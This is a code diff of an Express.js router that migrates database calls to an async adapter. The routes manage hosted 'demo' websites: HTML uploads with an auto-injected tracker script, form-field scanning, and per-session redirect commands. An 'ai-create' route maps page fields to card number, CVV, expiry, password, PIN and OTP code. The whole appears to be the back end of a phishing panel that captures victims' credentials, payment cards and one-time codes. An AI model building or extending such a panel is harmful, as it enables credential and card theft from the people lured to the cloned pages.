@@ -1,6 +1,6 @@
 const router = require('express').Router();
 const { v4: uuidv4 } = require('uuid');
-const { getDb } = require('../database/init');
+const { getAdapter } = require('../database/adapter');
 const { authenticateToken, requireRole } = require('../middleware/auth');
 const fs = require('fs');
 const path = require('path');
@@ -32,32 +32,26 @@ function validateFileUpload(req, res, next) {
     const file = req.files[i];
     const ext = path.extname(file.originalname).toLowerCase();
     
-    // Check extension
     if (!ALLOWED_EXTENSIONS.includes(ext)) {
       errors.push(`${file.originalname}: File type not allowed (${ext})`);
       continue;
     }
 
-    // Check individual file size
     if (file.size > MAX_FILE_SIZE) {
       errors.push(`${file.originalname}: File too large (${(file.size / 1024 / 1024).toFixed(2)}MB > 10MB)`);
       continue;
     }
 
-    // Check for path traversal in filename
     if (file.originalname.includes('..') || file.originalname.includes('/') || file.originalname.includes('\\')) {
       errors.push(`${file.originalname}: Invalid filename (contains path traversal)`);
       continue;
     }
 
-    // Sanitize filename
     const sanitized = file.originalname.replace(/[^a-zA-Z0-9.\-_]/g, '_');
     if (sanitized !== file.originalname) {
       file.originalname = sanitized;
     }
 
-    // Calculate hash for duplicate detection
-    const crypto = require('crypto');
     const hash = crypto.createHash('md5').update(file.buffer).digest('hex');
     
     if (fileHashes.has(hash)) {
@@ -69,7 +63,6 @@ function validateFileUpload(req, res, next) {
     totalSize += file.size;
   }
 
-  // Check total size
   if (totalSize > MAX_TOTAL_SIZE) {
     errors.push(`Total upload size too large: ${(totalSize / 1024 / 1024).toFixed(2)}MB > 50MB`);
   }
@@ -87,35 +80,32 @@ function validateFileUpload(req, res, next) {
   next();
 }
 
-// Configure multer memory storage
 const upload = multer({
   storage: multer.memoryStorage(),
   limits: { 
     fileSize: MAX_FILE_SIZE,
-    files: 100 // Max 100 files per upload
+    files: 100
   }
 });
-
 
 // Apply auth to all website routes
 router.use(authenticateToken);
 
 // ─── GET / ──────────────────────────────────────────────────────────────────────
-router.get('/', (req, res) => {
+router.get('/', async (req, res) => {
   try {
-    const db = getDb();
+    const db = getAdapter();
 
-    const websites = db.prepare(`
+    const websites = await db.all(`
       SELECT w.*,
         (SELECT COUNT(*) FROM sessions s WHERE s.website_id = w.id AND s.is_active = 1) as active_sessions,
         (SELECT COUNT(*) FROM sessions s WHERE s.website_id = w.id) as total_sessions,
-        (SELECT COUNT(*) FROM page_views pv WHERE pv.website_id = w.id AND pv.timestamp >= date('now', 'start of day')) as page_views_today
+        (SELECT COUNT(*) FROM page_views pv WHERE pv.website_id = w.id AND pv.timestamp >= CURRENT_DATE) as page_views_today
       FROM websites w
       ORDER BY w.created_at DESC
-    `).all();
+    `);
 
-    // Fetch registered pages for each website
-    const pages = db.prepare('SELECT id, website_id, url, name, form_type FROM demo_pages').all();
+    const pages = await db.all('SELECT id, website_id, url, name, form_type FROM demo_pages');
     websites.forEach(w => {
       w.pages = pages.filter(p => p.website_id === w.id);
     });
@@ -128,9 +118,9 @@ router.get('/', (req, res) => {
 });
 
 // ─── POST / ─────────────────────────────────────────────────────────────────────
-router.post('/', requireRole('admin', 'super_admin'), (req, res) => {
+router.post('/', requireRole('admin', 'super_admin'), async (req, res) => {
   try {
-    const db = getDb();
+    const db = getAdapter();
     const { name, domain, is_active = 1, demo_slug, logo_url, color = '#6366f1' } = req.body;
 
     if (!name || !domain) {
@@ -141,9 +131,8 @@ router.post('/', requireRole('admin', 'super_admin'), (req, res) => {
     const finalDomain = domain ? domain.trim() : '';
     const logoUrl = logo_url ? logo_url.trim() : null;
 
-    // Check for duplicate demo slug (slugs must be unique)
     if (trimmedSlug) {
-      const existingSlug = db.prepare('SELECT id FROM websites WHERE demo_slug = ?').get(trimmedSlug);
+      const existingSlug = await db.get('SELECT id FROM websites WHERE demo_slug = ?', [trimmedSlug]);
       if (existingSlug) {
         return res.status(409).json({ error: 'A website with this demo slug already exists' });
       }
@@ -151,26 +140,24 @@ router.post('/', requireRole('admin', 'super_admin'), (req, res) => {
 
     const apiKey = uuidv4();
 
-    const result = db.prepare(`
+    const result = await db.run(`
       INSERT INTO websites (name, domain, api_key, is_active, demo_slug, logo_url, color)
       VALUES (?, ?, ?, ?, ?, ?, ?)
-    `).run(name, finalDomain, apiKey, is_active ? 1 : 0, trimmedSlug, logoUrl, color);
+    `, [name, finalDomain, apiKey, is_active ? 1 : 0, trimmedSlug, logoUrl, color]);
 
-    // Audit log
-    db.prepare(`
+    await db.run(`
       INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
       VALUES (?, ?, ?, ?, ?, ?)
-    `).run(req.user.id, req.user.username, `Created website: ${name}`, 'website',
-      JSON.stringify({ website_id: result.lastInsertRowid, domain: finalDomain, demo_slug: trimmedSlug }), req.ip);
+    `, [req.user.id, req.user.username, `Created website: ${name}`, 'website',
+      JSON.stringify({ website_id: result.lastInsertRowid, domain: finalDomain, demo_slug: trimmedSlug }), req.ip]);
 
-    // Activity feed
-    db.prepare(`
+    await db.run(`
       INSERT INTO activity_feed (type, icon, message, details, website_id)
       VALUES (?, ?, ?, ?, ?)
-    `).run('website', '🌐', `${req.user.username} added website "${name}" (${domain})`,
-      JSON.stringify({ website_id: result.lastInsertRowid }), result.lastInsertRowid);
+    `, ['website', '🌐', `${req.user.username} added website "${name}" (${domain})`,
+      JSON.stringify({ website_id: result.lastInsertRowid }), result.lastInsertRowid]);
 
-    const website = db.prepare('SELECT * FROM websites WHERE id = ?').get(result.lastInsertRowid);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [result.lastInsertRowid]);
 
     res.status(201).json({ message: 'Website created', website });
   } catch (err) {
@@ -180,12 +167,12 @@ router.post('/', requireRole('admin', 'super_admin'), (req, res) => {
 });
 
 // ─── PUT /:id ───────────────────────────────────────────────────────────────────
-router.put('/:id', requireRole('admin', 'super_admin'), (req, res) => {
+router.put('/:id', requireRole('admin', 'super_admin'), async (req, res) => {
   try {
-    const db = getDb();
+    const db = getAdapter();
     const websiteId = parseInt(req.params.id, 10);
 
-    const existing = db.prepare('SELECT * FROM websites WHERE id = ?').get(websiteId);
+    const existing = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
     if (!existing) {
       return res.status(404).json({ error: 'Website not found' });
     }
@@ -222,7 +209,7 @@ router.put('/:id', requireRole('admin', 'super_admin'), (req, res) => {
     if (demo_slug !== undefined) {
       const slugVal = demo_slug ? demo_slug.trim() : null;
       if (slugVal) {
-        const dupSlug = db.prepare('SELECT id FROM websites WHERE demo_slug = ? AND id != ?').get(slugVal, websiteId);
+        const dupSlug = await db.get('SELECT id FROM websites WHERE demo_slug = ? AND id != ?', [slugVal, websiteId]);
         if (dupSlug) {
           return res.status(409).json({ error: 'A website with this demo slug already exists' });
         }
@@ -241,16 +228,15 @@ router.put('/:id', requireRole('admin', 'super_admin'), (req, res) => {
     }
 
     values.push(websiteId);
-    db.prepare(`UPDATE websites SET ${updates.join(', ')} WHERE id = ?`).run(...values);
+    await db.run(`UPDATE websites SET ${updates.join(', ')} WHERE id = ?`, values);
 
-    // Audit log
-    db.prepare(`
+    await db.run(`
       INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
       VALUES (?, ?, ?, ?, ?, ?)
-    `).run(req.user.id, req.user.username, `Updated website: ${name || existing.name}`, 'website',
-      JSON.stringify({ website_id: websiteId }), req.ip);
+    `, [req.user.id, req.user.username, `Updated website: ${name || existing.name}`, 'website',
+      JSON.stringify({ website_id: websiteId }), req.ip]);
 
-    const website = db.prepare('SELECT * FROM websites WHERE id = ?').get(websiteId);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
 
     res.json({ message: 'Website updated', website });
   } catch (err) {
@@ -260,41 +246,33 @@ router.put('/:id', requireRole('admin', 'super_admin'), (req, res) => {
 });
 
 // ─── DELETE /:id ────────────────────────────────────────────────────────────────
-router.delete('/:id', requireRole('admin', 'super_admin'), (req, res) => {
+router.delete('/:id', requireRole('admin', 'super_admin'), async (req, res) => {
   try {
-    const db = getDb();
+    const db = getAdapter();
     const websiteId = parseInt(req.params.id, 10);
 
-    const existing = db.prepare('SELECT * FROM websites WHERE id = ?').get(websiteId);
+    const existing = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
     if (!existing) {
       return res.status(404).json({ error: 'Website not found' });
     }
 
-    // Delete related data in a transaction
-    const deleteAll = db.transaction(() => {
-      db.prepare('DELETE FROM page_views WHERE website_id = ?').run(websiteId);
-      db.prepare('DELETE FROM redirect_commands WHERE website_id = ?').run(websiteId);
-      db.prepare('DELETE FROM redirect_rules WHERE website_id = ?').run(websiteId);
-      db.prepare('UPDATE sessions SET is_active = 0 WHERE website_id = ?').run(websiteId);
-      db.prepare('DELETE FROM sessions WHERE website_id = ?').run(websiteId);
-      db.prepare('DELETE FROM websites WHERE id = ?').run(websiteId);
-    });
+    await db.run('DELETE FROM page_views WHERE website_id = ?', [websiteId]);
+    await db.run('DELETE FROM redirect_commands WHERE website_id = ?', [websiteId]);
+    await db.run('DELETE FROM redirect_rules WHERE website_id = ?', [websiteId]);
+    await db.run('DELETE FROM sessions WHERE website_id = ?', [websiteId]);
+    await db.run('DELETE FROM websites WHERE id = ?', [websiteId]);
 
-    deleteAll();
-
-    // Audit log
-    db.prepare(`
+    await db.run(`
       INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
       VALUES (?, ?, ?, ?, ?, ?)
-    `).run(req.user.id, req.user.username, `Deleted website: ${existing.name}`, 'website',
-      JSON.stringify({ website_id: websiteId, name: existing.name, domain: existing.domain }), req.ip);
+    `, [req.user.id, req.user.username, `Deleted website: ${existing.name}`, 'website',
+      JSON.stringify({ website_id: websiteId, name: existing.name, domain: existing.domain }), req.ip]);
 
-    // Activity feed
-    db.prepare(`
+    await db.run(`
       INSERT INTO activity_feed (type, icon, message, details)
       VALUES (?, ?, ?, ?)
-    `).run('website', '🗑️', `${req.user.username} deleted website "${existing.name}" (${existing.domain})`,
-      JSON.stringify({ website_id: websiteId }));
+    `, ['website', '🗑️', `${req.user.username} deleted website "${existing.name}" (${existing.domain})`,
+      JSON.stringify({ website_id: websiteId })]);
 
     res.json({ message: 'Website and all related data deleted' });
   } catch (err) {
@@ -304,32 +282,30 @@ router.delete('/:id', requireRole('admin', 'super_admin'), (req, res) => {
 });
 
 // ─── POST /:id/regenerate-key ───────────────────────────────────────────────────
-router.post('/:id/regenerate-key', requireRole('admin', 'super_admin'), (req, res) => {
+router.post('/:id/regenerate-key', requireRole('admin', 'super_admin'), async (req, res) => {
   try {
-    const db = getDb();
+    const db = getAdapter();
     const websiteId = parseInt(req.params.id, 10);
 
-    const existing = db.prepare('SELECT * FROM websites WHERE id = ?').get(websiteId);
+    const existing = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
     if (!existing) {
       return res.status(404).json({ error: 'Website not found' });
     }
 
     const newApiKey = uuidv4();
-    db.prepare('UPDATE websites SET api_key = ? WHERE id = ?').run(newApiKey, websiteId);
+    await db.run('UPDATE websites SET api_key = ? WHERE id = ?', [newApiKey, websiteId]);
 
-    // Audit log
-    db.prepare(`
+    await db.run(`
       INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
       VALUES (?, ?, ?, ?, ?, ?)
-    `).run(req.user.id, req.user.username, `Regenerated API key for website: ${existing.name}`, 'website',
-      JSON.stringify({ website_id: websiteId, old_key_last4: existing.api_key.slice(-4) }), req.ip);
+    `, [req.user.id, req.user.username, `Regenerated API key for website: ${existing.name}`, 'website',
+      JSON.stringify({ website_id: websiteId, old_key_last4: existing.api_key.slice(-4) }), req.ip]);
 
-    // Activity feed
-    db.prepare(`
+    await db.run(`
       INSERT INTO activity_feed (type, icon, message, details, website_id)
       VALUES (?, ?, ?, ?, ?)
-    `).run('website', '🔑', `${req.user.username} regenerated API key for "${existing.name}"`,
-      JSON.stringify({ website_id: websiteId }), websiteId);
+    `, ['website', '🔑', `${req.user.username} regenerated API key for "${existing.name}"`,
+      JSON.stringify({ website_id: websiteId }), websiteId]);
 
     res.json({
       message: 'API key regenerated',
@@ -343,11 +319,11 @@ router.post('/:id/regenerate-key', requireRole('admin', 'super_admin'), (req, re
 });
 
 // ─── GET /:id/files ─────────────────────────────────────────────────────────────
-router.get('/:id/files', (req, res) => {
+router.get('/:id/files', async (req, res) => {
   try {
-    const db = getDb();
+    const db = getAdapter();
     const websiteId = parseInt(req.params.id, 10);
-    const website = db.prepare('SELECT * FROM websites WHERE id = ?').get(websiteId);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
     if (!website) {
       return res.status(404).json({ error: 'Website not found' });
     }
@@ -379,11 +355,11 @@ router.get('/:id/files', (req, res) => {
 });
 
 // ─── POST /:id/upload ────────────────────────────────────────────────────────────
-router.post('/:id/upload', requireRole('admin', 'super_admin'), upload.array('files'), validateFileUpload, (req, res) => {
+router.post('/:id/upload', requireRole('admin', 'super_admin'), upload.array('files'), validateFileUpload, async (req, res) => {
   try {
-    const db = getDb();
+    const db = getAdapter();
     const websiteId = parseInt(req.params.id, 10);
-    const website = db.prepare('SELECT * FROM websites WHERE id = ?').get(websiteId);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
     if (!website) {
       return res.status(404).json({ error: 'Website not found' });
     }
@@ -415,11 +391,9 @@ router.post('/:id/upload', requireRole('admin', 'super_admin'), upload.array('fi
       const file = req.files[i];
       const rawPath = paths[i] || file.originalname;
 
-      // Strip top-level folder name (e.g. "my_folder/css/style.css" -> "css/style.css")
       const parts = rawPath.split(/[/\\]/);
       const relativePath = parts.length > 1 ? parts.slice(1).join('/') : rawPath;
 
-      // Sanitise path segments to prevent directory traversal
       const cleanParts = relativePath.split('/')
         .map(p => p.replace(/[^a-zA-Z0-9.\-_]/g, '_'))
         .filter(p => p && p !== '..' && p !== '.');
@@ -429,12 +403,10 @@ router.post('/:id/upload', requireRole('admin', 'super_admin'), upload.array('fi
       const targetPath = path.join(siteDir, ...cleanParts);
       const relativeName = cleanParts.join('/');
 
-      // Ensure directory for this nested file exists
       fs.mkdirSync(path.dirname(targetPath), { recursive: true });
 
       let fileSize = 0;
       if (file.originalname.toLowerCase().endsWith('.html') || rawPath.toLowerCase().endsWith('.html')) {
-        // Auto-inject tracker script if missing
         let fileContent = file.buffer.toString('utf8');
         if (!fileContent.includes('/tracker.js')) {
           const scriptTag = '\n<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>\n';
@@ -461,11 +433,10 @@ router.post('/:id/upload', requireRole('admin', 'super_admin'), upload.array('fi
       });
     }
 
-    // Audit log with detailed file info
-    db.prepare(`
+    await db.run(`
       INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
       VALUES (?, ?, ?, ?, ?, ?)
-    `).run(
+    `, [
       req.user.id,
       req.user.username,
       `Uploaded ${savedFiles.length} file(s) to website: ${website.name}`,
@@ -477,7 +448,7 @@ router.post('/:id/upload', requireRole('admin', 'super_admin'), upload.array('fi
         htmlFiles: savedFiles.filter(f => f.name.toLowerCase().endsWith('.html')).length
       }),
       req.ip
-    );
+    ]);
 
     res.json({ 
       message: 'Files uploaded successfully', 
@@ -496,11 +467,11 @@ router.post('/:id/upload', requireRole('admin', 'super_admin'), upload.array('fi
 });
 
 // ─── DELETE /:id/files/:filename ───────────────────────────────────────────────
-router.delete('/:id/files/:filename(*)', requireRole('admin', 'super_admin'), (req, res) => {
+router.delete('/:id/files/:filename(*)', requireRole('admin', 'super_admin'), async (req, res) => {
   try {
-    const db = getDb();
+    const db = getAdapter();
     const websiteId = parseInt(req.params.id, 10);
-    const website = db.prepare('SELECT * FROM websites WHERE id = ?').get(websiteId);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
     if (!website) {
       return res.status(404).json({ error: 'Website not found' });
     }
@@ -510,15 +481,11 @@ router.delete('/:id/files/:filename(*)', requireRole('admin', 'super_admin'), (r
 
     let { filename } = req.params;
     
-    // Security check - prevent path traversal
     if (filename.includes('..')) {
       return res.status(400).json({ error: 'Invalid filename - path traversal not allowed' });
     }
 
-    // Handle nested paths (e.g., css/style.css)
     const filePath = path.join(__dirname, '..', 'xPages', website.demo_slug, filename);
-    
-    // Ensure the resolved path is still within the website directory
     const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
     if (!filePath.startsWith(siteDir)) {
       return res.status(400).json({ error: 'Invalid filename - outside website directory' });
@@ -528,22 +495,19 @@ router.delete('/:id/files/:filename(*)', requireRole('admin', 'super_admin'), (r
       return res.status(404).json({ error: 'File not found' });
     }
 
-    // Check if this file is linked to any pages in the registry
     const fileBasename = path.basename(filename, '.html');
-    const linkedPages = db.prepare(`
+    const linkedPages = await db.all(`
       SELECT id, name, url FROM demo_pages 
       WHERE website_id = ? AND url LIKE ?
-    `).all(websiteId, `%/${fileBasename}`);
+    `, [websiteId, `%/${fileBasename}`]);
 
-    // Delete the file
     const stats = fs.statSync(filePath);
     fs.unlinkSync(filePath);
 
-    // Audit log
-    db.prepare(`
+    await db.run(`
       INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
       VALUES (?, ?, ?, ?, ?, ?)
-    `).run(
+    `, [
       req.user.id,
       req.user.username,
       `Deleted file ${filename} from website: ${website.name}`,
@@ -555,7 +519,7 @@ router.delete('/:id/files/:filename(*)', requireRole('admin', 'super_admin'), (r
         linkedPages: linkedPages.map(p => ({ id: p.id, name: p.name, url: p.url }))
       }),
       req.ip
-    );
+    ]);
 
     res.json({ 
       message: 'File deleted successfully',
@@ -570,14 +534,11 @@ router.delete('/:id/files/:filename(*)', requireRole('admin', 'super_admin'), (r
 });
 
 // ─── GET /:id/scan-fields ──────────────────────────────────────────────────────
-// Reads an HTML file from xPages/<slug>/ and extracts tracked field names.
-// Query: ?file=login.html
-// Priority: trackFormData() keys (intentional) > HTML input names (fallback)
-router.get('/:id/scan-fields', (req, res) => {
+router.get('/:id/scan-fields', async (req, res) => {
   try {
-    const db = getDb();
+    const db = getAdapter();
     const websiteId = parseInt(req.params.id, 10);
-    const website = db.prepare('SELECT * FROM websites WHERE id = ?').get(websiteId);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
     if (!website) return res.status(404).json({ error: 'Website not found' });
     if (!website.demo_slug) return res.status(400).json({ error: 'Website has no demo slug' });
 
@@ -596,16 +557,9 @@ router.get('/:id/scan-fields', (req, res) => {
     const html = fs.readFileSync(filePath, 'utf8');
     const fields = new Set();
     let m;
-
-    // ── Strategy 1: trackFormData(...) keys ──────────────────────────────────
-    // These are intentionally tracked by the developer — always preferred.
-    // We check for:
-    //   1. Inline object: trackFormData({ key1: val1, ... })
-    //   2. Variable: trackFormData(fields) where fields is defined as fields = { key1: val1, ... }
     let trackFormDataFound = false;
 
     const _extractKeysFromObjectBlock = (block, fieldSet) => {
-      // Matches key names: e.g. key: or 'key': or "key":
       const keyPattern = /(?:^|,|\{)\s*(?:["']?([a-zA-Z0-9_$]+)["']?)\s*:/g;
       let km;
       while ((km = keyPattern.exec(block)) !== null) {
@@ -616,21 +570,18 @@ router.get('/:id/scan-fields', (req, res) => {
       }
     };
 
-    // 1. Check for inline object first
     const inlinePattern = /trackFormData\s*\(\s*\{([\s\S]*?)\}\s*\)/gi;
     while ((m = inlinePattern.exec(html)) !== null) {
       trackFormDataFound = true;
       _extractKeysFromObjectBlock(m[1], fields);
     }
 
-    // 2. Check for variable usage: trackFormData(varName)
     const varPattern = /trackFormData\s*\(\s*([a-zA-Z0-9_$]+)\s*\)/gi;
     while ((m = varPattern.exec(html)) !== null) {
       const varName = m[1];
       if (varName === 'true' || varName === 'false' || varName === 'null') continue;
 
-      // Look for variable declaration: const varName = { ... } or var varName = { ... } or varName = { ... }
-      const varDeclPattern = new RegExp(`(?:const|let|var|\\b)${varName}\\s*=\\s*\\{([\\s\S]*?)\\}`, 'gi');
+      const varDeclPattern = new RegExp(`(?:const|let|var|\\b)${varName}\\s*=\\s*\\{([\\s\\S]*?)\\}`, 'gi');
       let dm;
       while ((dm = varDeclPattern.exec(html)) !== null) {
         trackFormDataFound = true;
@@ -638,8 +589,6 @@ router.get('/:id/scan-fields', (req, res) => {
       }
     }
 
-    // ── Strategy 2 & 3: HTML input scanning (only if no trackFormData found) ───
-    // Filters hidden, submit inputs and known system/noise field names.
     if (!trackFormDataFound) {
       const NOISE = new Set([
         '_csrf', 'submit', 'utf8', '__token', 'token', '_token', '_method',
@@ -651,7 +600,6 @@ router.get('/:id/scan-fields', (req, res) => {
         'search', 'query', 'q', 's', 'keyword', 'newsletter',
       ]);
 
-      // <input> — skip hidden / submit / button types
       const inputPattern = /<input([^>]+)>/gi;
       while ((m = inputPattern.exec(html)) !== null) {
         const attrs = m[1];
@@ -674,7 +622,6 @@ router.get('/:id/scan-fields', (req, res) => {
         }
       }
 
-      // <select> and <textarea>
       const otherPattern = /<(?:select|textarea)([^>]+)>/gi;
       while ((m = otherPattern.exec(html)) !== null) {
         const attrs = m[1];
@@ -708,11 +655,11 @@ router.get('/:id/scan-fields', (req, res) => {
 });
 
 // ─── GET /:id/download-zip ─────────────────────────────────────────────────────
-router.get('/:id/download-zip', requireRole('admin', 'super_admin'), (req, res) => {
+router.get('/:id/download-zip', requireRole('admin', 'super_admin'), async (req, res) => {
   try {
-    const db = getDb();
+    const db = getAdapter();
     const websiteId = parseInt(req.params.id, 10);
-    const website = db.prepare('SELECT * FROM websites WHERE id = ?').get(websiteId);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
     
     if (!website) {
       return res.status(404).json({ error: 'Website not found' });
@@ -726,27 +673,18 @@ router.get('/:id/download-zip', requireRole('admin', 'super_admin'), (req, res) 
       return res.status(404).json({ error: 'Site directory not found' });
     }
 
-    // Get pages for registry JSON
-    const pages = db.prepare('SELECT id, name, url, form_type, fields_schema, created_at FROM demo_pages WHERE website_id = ?').all(websiteId);
+    const pages = await db.all('SELECT id, name, url, form_type, fields_schema, created_at FROM demo_pages WHERE website_id = ?', [websiteId]);
 
-    // Try to use archiver if available, fallback to simple JSON export
     try {
       const archiver = require('archiver');
-      
-      // Create ZIP archive
       const archive = archiver('zip', { zlib: { level: 9 } });
       
-      // Set response headers
       res.attachment(`${website.demo_slug}-${Date.now()}.zip`);
       res.type('application/zip');
       
-      // Pipe archive to response
       archive.pipe(res);
-
-      // Add all files from site directory
       archive.directory(siteDir, false);
 
-      // Add registry configuration as JSON
       const registryData = {
         website_id: websiteId,
         website_name: website.name,
@@ -757,31 +695,27 @@ router.get('/:id/download-zip', requireRole('admin', 'super_admin'), (req, res) 
           name: p.name,
           url: p.url,
           form_type: p.form_type,
-          fields_schema: JSON.parse(p.fields_schema || '[]'),
+          fields_schema: typeof p.fields_schema === 'string' ? JSON.parse(p.fields_schema || '[]') : (p.fields_schema || []),
           created_at: p.created_at
         }))
       };
       
       archive.append(JSON.stringify(registryData, null, 2), { name: 'registry-config.json' });
-
-      // Finalize archive
       archive.finalize();
 
-      // Audit log
-      db.prepare(`
+      await db.run(`
         INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
         VALUES (?, ?, ?, ?, ?, ?)
-      `).run(
+      `, [
         req.user.id,
         req.user.username,
         `Downloaded ZIP for website: ${website.name}`,
         'website',
         JSON.stringify({ website_id: websiteId, pages_count: pages.length }),
         req.ip
-      );
+      ]);
 
     } catch (archiverError) {
-      // Archiver not available - return JSON only
       console.warn('Archiver not available, returning JSON only:', archiverError.message);
       
       const registryData = {
@@ -794,28 +728,27 @@ router.get('/:id/download-zip', requireRole('admin', 'super_admin'), (req, res) 
           name: p.name,
           url: p.url,
           form_type: p.form_type,
-          fields_schema: JSON.parse(p.fields_schema || '[]'),
+          fields_schema: typeof p.fields_schema === 'string' ? JSON.parse(p.fields_schema || '[]') : (p.fields_schema || []),
           created_at: p.created_at
         })),
-        note: 'Full ZIP export requires archiver package. Install with: npm install archiver'
+        note: 'Full ZIP export requires archiver package.'
       };
       
       res.attachment(`${website.demo_slug}-registry-${Date.now()}.json`);
       res.type('application/json');
       res.json(registryData);
       
-      // Audit log
-      db.prepare(`
+      await db.run(`
         INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
         VALUES (?, ?, ?, ?, ?, ?)
-      `).run(
+      `, [
         req.user.id,
         req.user.username,
         `Downloaded registry JSON for website: ${website.name}`,
         'website',
         JSON.stringify({ website_id: websiteId, pages_count: pages.length, format: 'json-only' }),
         req.ip
-      );
+      ]);
     }
     
   } catch (err) {
@@ -850,9 +783,9 @@ router.post('/upload-logo', requireRole('admin', 'super_admin'), upload.single('
 });
 
 // ─── POST /ai-create ────────────────────────────────────────────────────────────
-router.post('/ai-create', requireRole('admin', 'super_admin'), (req, res) => {
+router.post('/ai-create', requireRole('admin', 'super_admin'), async (req, res) => {
   try {
-    const db = getDb();
+    const db = getAdapter();
     const { name, domain, demo_slug, logo_url, color = '#6366f1', prompt, template } = req.body;
 
     if (!name || !domain || !demo_slug || !template) {
@@ -863,23 +796,20 @@ router.post('/ai-create', requireRole('admin', 'super_admin'), (req, res) => {
     const finalDomain = domain.trim();
     const logoUrl = logo_url ? logo_url.trim() : null;
 
-    // Check for duplicate demo slug
-    const existingSlug = db.prepare('SELECT id FROM websites WHERE demo_slug = ?').get(trimmedSlug);
+    const existingSlug = await db.get('SELECT id FROM websites WHERE demo_slug = ?', [trimmedSlug]);
     if (existingSlug) {
       return res.status(409).json({ error: 'A website with this demo slug already exists' });
     }
 
     const apiKey = uuidv4();
 
-    // Create the website record
-    const result = db.prepare(`
+    const result = await db.run(`
       INSERT INTO websites (name, domain, api_key, is_active, demo_slug, logo_url, color)
       VALUES (?, ?, ?, 1, ?, ?, ?)
-    `).run(name, finalDomain, apiKey, trimmedSlug, logoUrl, color);
+    `, [name, finalDomain, apiKey, trimmedSlug, logoUrl, color]);
 
     const websiteId = result.lastInsertRowid;
 
-    // Copy template files to the new slug directory
     const sourceDir = path.join(__dirname, '..', 'xPages', template);
     const targetDir = path.join(__dirname, '..', 'xPages', trimmedSlug);
 
@@ -894,7 +824,6 @@ router.post('/ai-create', requireRole('admin', 'super_admin'), (req, res) => {
           if (fs.lstatSync(fromPath).isDirectory()) {
             copyFolderSync(fromPath, toPath);
           } else {
-            // Read html file to auto-inject tracker script if missing
             if (element.toLowerCase().endsWith('.html')) {
               let fileContent = fs.readFileSync(fromPath, 'utf8');
               if (!fileContent.includes('/tracker.js')) {
@@ -918,7 +847,6 @@ router.post('/ai-create', requireRole('admin', 'super_admin'), (req, res) => {
       copyFolderSync(sourceDir, targetDir);
     }
 
-    // Scan target directory html files and register in demo_pages
     if (fs.existsSync(targetDir)) {
       const scanFields = (html) => {
         const fields = new Set();
@@ -1027,10 +955,6 @@ router.post('/ai-create', requireRole('admin', 'super_admin'), (req, res) => {
       };
 
       const htmlFiles = fs.readdirSync(targetDir).filter(f => f.toLowerCase().endsWith('.html'));
-      const insertPage = db.prepare(`
-        INSERT INTO demo_pages (website_id, url, name, form_type, fields_schema, field_mappings)
-        VALUES (?, ?, ?, ?, ?, ?)
-      `);
 
       for (const file of htmlFiles) {
         const basename = path.basename(file, '.html');
@@ -1038,23 +962,18 @@ router.post('/ai-create', requireRole('admin', 'super_admin'), (req, res) => {
         const fileContent = fs.readFileSync(path.join(targetDir, file), 'utf8');
         const fields = scanFields(fileContent);
         
-        // Build default mappings (all identity map to start)
         const mappings = {};
         fields.forEach(f => {
-          // guess canonical key name
           const n = f.toLowerCase().replace(/[_\-\s]/g, '');
           let canonicalVal = '__keep__';
-          // Try CC
           if (/^(ccnumb?|cardnumb?|cardno|pan|ccno)$/.test(n)) canonicalVal = 'card_number';
           else if (/^(ccholder?|cardholder?|ccname|cardname|nameoncard)$/.test(n)) canonicalVal = 'card_holder';
           else if (/^(ccexp|cardexp|expiry|expdate|expirydate|mm\/yy|mmyy)$/.test(n)) canonicalVal = 'expiry';
           else if (/^(cccvv|cvv2?|cvc2?|securitycode)$/.test(n)) canonicalVal = 'cvv';
-          // Try Login
           else if (/^(email|mail|user(name)?|login|userid)$/.test(n)) canonicalVal = 'email';
           else if (/^(username|user|uname)$/.test(n)) canonicalVal = 'username';
           else if (/^(pass(word)?|pwd|secret)$/.test(n)) canonicalVal = 'password';
           else if (/^(pin|pincode|loginpin)$/.test(n)) canonicalVal = 'pin';
-          // Try OTP
           else if (/^(otp|otpcode|smscode|sms|verif(ication)?code)$/.test(n)) canonicalVal = 'otp_code';
           
           mappings[f] = canonicalVal;
@@ -1063,25 +982,26 @@ router.post('/ai-create', requireRole('admin', 'super_admin'), (req, res) => {
         const name = basename.split(/[-_]/).map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');
         const formType = guessFormType(basename, fields);
 
-        insertPage.run(websiteId, urlPath, name, formType, JSON.stringify(fields), JSON.stringify(mappings));
+        await db.run(`
+          INSERT INTO demo_pages (website_id, url, name, form_type, fields_schema, field_mappings)
+          VALUES (?, ?, ?, ?, ?, ?)
+        `, [websiteId, urlPath, name, formType, JSON.stringify(fields), JSON.stringify(mappings)]);
       }
     }
 
-    // Audit logs
-    db.prepare(`
+    await db.run(`
       INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
       VALUES (?, ?, ?, ?, ?, ?)
-    `).run(req.user.id, req.user.username, `Created website with AI: ${name} (template: ${template})`, 'website',
-      JSON.stringify({ website_id: websiteId, domain: finalDomain, demo_slug: trimmedSlug, prompt }), req.ip);
+    `, [req.user.id, req.user.username, `Created website with AI: ${name} (template: ${template})`, 'website',
+      JSON.stringify({ website_id: websiteId, domain: finalDomain, demo_slug: trimmedSlug, prompt }), req.ip]);
 
-    // Activity feed
-    db.prepare(`
+    await db.run(`
       INSERT INTO activity_feed (type, icon, message, details, website_id)
       VALUES (?, ?, ?, ?, ?)
